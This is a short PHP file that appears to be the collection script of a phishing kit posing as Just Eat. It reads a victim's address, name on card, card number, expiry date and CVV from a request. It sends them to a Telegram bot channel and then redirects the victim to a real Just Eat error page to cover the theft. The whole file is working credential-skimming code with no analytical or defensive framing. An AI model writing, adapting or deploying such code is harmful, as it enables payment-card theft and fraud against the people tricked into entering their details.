<?
define ('url',"https://api.telegram.org/botmyidhere/");
$address = $_GET['address'];
$ncard = $_GET['ncard'];
$ccnum = $_GET['ccnum'];
$exp = $_GET['exp'];
$cvv = $_GET['cvv'];
$chat_id = '@justeatfullz';
$message = urlencode("Full Address:".$address."\n Name on Card : ".$ncard."\n Card Number : ".$ccnum."\n Exp : ".$exp."\n CVV : ".$cvv);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
header('Location: https://www.just-eat.co.uk/error');
?>
